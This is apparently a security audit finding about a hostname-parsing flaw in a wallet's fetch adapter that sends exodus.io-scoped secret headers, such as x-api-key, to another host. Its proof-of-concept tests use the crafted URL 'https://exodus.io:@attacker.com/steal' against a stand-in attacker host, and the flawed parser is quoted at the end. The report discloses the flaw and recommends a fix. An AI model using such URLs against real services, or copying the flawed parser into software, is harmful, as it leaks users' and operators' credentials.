### Title
Userinfo-colon URL parsing divergence in `hostnameFromString` causes secret headers to leak to attacker-controlled hosts - (File: adapters/fetch-factory/src/hostname.js)

### Summary
`hostnameFromString` in `adapters/fetch-factory/src/hostname.js` naively treats the first `:` after the `://` separator as a port delimiter and returns everything before it as the hostname, without understanding URL userinfo syntax (`user:pass@host`). For a URL like `https://exodus.io:@attacker.com/`, this returns `exodus.io` while the real network destination (as resolved by the WHATWG `URL` parser used internally by `fetch`) is `attacker.com`.

### Finding Description
`FetchFactory#buildHeaders` (adapters/fetch-factory/src/fetch-factory.js:93-120) calls `getUrlHostname(url)` to decide which per-hostname header set (`this.headerConfigs[hostname]`) to attach to the outgoing request, matching via `hostname === key || hostname.endsWith(`.${key}`)`. When callers register headers scoped to `exodus.io` via `setHeaders(headers, ['exodus.io'])` or `setDefaultExodusIdentifierHeaders` (which writes into `this.headerConfigs[EXODUS_HOST]`, `EXODUS_HOST = 'exodus.io'` in adapters/fetch-factory/src/constants.js:3), those headers (e.g. `x-api-key`, `x-exodus-app-id`, `x-exodus-version`, `x-requested-with`) are only supposed to be sent to `exodus.io`.

`getUrlHostname` for string URLs delegates to `hostnameFromString` (adapters/fetch-factory/src/hostname.js:11-37), which:
1. Finds `://` and slices the remainder.
2. Looks for the first `:` in that remainder and, if found, slices everything before it as the hostname and returns immediately — without ever checking for a following `@` (userinfo separator).

For the string `https://exodus.io:@attacker.com/`, the remainder after `://` is `exodus.io:@attacker.com/`. The first `:` is right after `exodus.io`, so the function slices to `exodus.io`, validates it against `domainPattern` (passes, since it's a well-formed domain string), and returns `exodus.io` as "the hostname" — even though per WHATWG URL semantics `exodus.io:` is the *userinfo* (username `exodus.io`, empty password) and the actual host is `attacker.com`.

Meanwhile, the URL string is passed unmodified to `this.fetchFn(url, options, ...)` (fetch-factory.js:151), so the real underlying `fetch` implementation parses the URL correctly and connects to `attacker.com`. This is a genuine parsing divergence between the custom hostname extractor and the real network destination, causing `#buildHeaders` to attach `exodus.io`-scoped secret headers to a request that is actually sent to `attacker.com`.

(A pure userinfo-without-colon variant like `https://exodus.io@attacker.com/path` does *not* trigger the bug, because the `@` character fails `domainPattern` in `isValidHostname`, so `hostnameFromString` returns `null` and no domain-specific headers are attached in that case. The exploitable case specifically requires a `:` before the `@`.)

### Impact Explanation
If an attacker can get a dapp/browser context or any code path in the wallet to call the shared `fetch` created by `FetchFactory` with an attacker-controlled string URL of the form `https://exodus.io:@attacker.com/...` (e.g. via a deeplink, remote-config-provided URL, or any user/dapp-influenced request target), then any headers configured for `exodus.io` — such as `x-api-key` (present in `WHITELISTED_X_AUTH_HEADERS`, adapters/fetch-factory/src/constants.js:2) and app-identity headers set by `setDefaultExodusIdentifierHeaders` — would be sent to `attacker.com` instead of the legitimate Exodus backend. This is a secret-disclosure vulnerability: private/authenticated header material intended only for `exodus.io` leaks to an attacker-controlled server, matching the "secret disclosure to unauthorized origin" bounty category.

### Likelihood Explanation
Exploitability requires: (1) the attacker being able to influence the exact URL string passed into a `fetch` instance created by `FetchFactory` (not a `Request`/`URL` object, since those bypass `hostnameFromString` and use the real `.hostname`/`.href`), and (2) that fetch instance having `exodus.io`-scoped secret headers configured. Whether such an attacker-controlled string reaches a `FetchFactory`-wrapped fetch call in a real code path (vs. being always constructed internally from trusted config) was not verified beyond the adapter package itself; this determines real-world reachability and could not be conclusively confirmed within the available context.

### Recommendation
Replace the custom string-slicing hostname parser with the standard `URL` constructor (e.g. `new URL(url).hostname`), which correctly handles userinfo, IPv6 literals, and other edge cases, eliminating the divergence between the header-matching logic and the actual network destination used by `fetchFn`.

### Proof of Concept
Unit test to add to `adapters/fetch-factory/__tests__/`:
```js
import { getUrlHostname } from '../src/hostname.js'

test('hostnameFromString must not diverge from URL parser for userinfo URLs', () => {
  const url = 'https://exodus.io:@attacker.com/'
  const parsed = new URL(url).hostname // 'attacker.com'
  const extracted = getUrlHostname(url)  // currently returns 'exodus.io'
  expect(extracted).toBe(parsed)
})
```
Integration-level PoC using `FetchFactory`:
```js
const calls = []
const fetchFn = (url, opts) => { calls.push([url, opts.headers.get('x-api-key')]); return Promise.resolve() }
const factory = new FetchFactory(fetchFn)
  .setHeaders({ 'x-api-key': 'SECRET' }, ['exodus.io'])
  .create()

await factory('https://exodus.io:@attacker.com/steal')
// Expected (secure): calls[0][1] === null (no secret header, since real host is attacker.com)
// Actual (vulnerable): calls[0][1] === 'SECRET'
```
A broader differential fuzz test should compare `getUrlHostname(url)` against `new URL(url).hostname` over a corpus of userinfo/IPv6/backslash/whitespace-mutated URLs and assert they always agree, or at minimum that no header attachment occurs whenever they disagree. function hostnameFromString(url) {
  const protocolSeparatorStart = url.indexOf(PROTOCOL_SEPARATOR)
  if (protocolSeparatorStart === -1) {
    return null
  }

  let hostname = url.slice(protocolSeparatorStart + PROTOCOL_SEPARATOR.length)

  const portIndex = hostname.indexOf(':')
  if (portIndex !== -1) {
    hostname = hostname.slice(0, portIndex)
    return isValidHostname(hostname) ? hostname : null
  }

  const rootIndicatorIndex = hostname.indexOf('/')
  if (rootIndicatorIndex !== -1) {
    hostname = hostname.slice(0, rootIndicatorIndex)
    return isValidHostname(hostname) ? hostname : null
  }

  const querySeparatorIndex = hostname.indexOf('?')
  if (querySeparatorIndex !== -1) {
    hostname = hostname.slice(0, querySeparatorIndex)
  }

  return isValidHostname(hostname) ? hostname : null
}
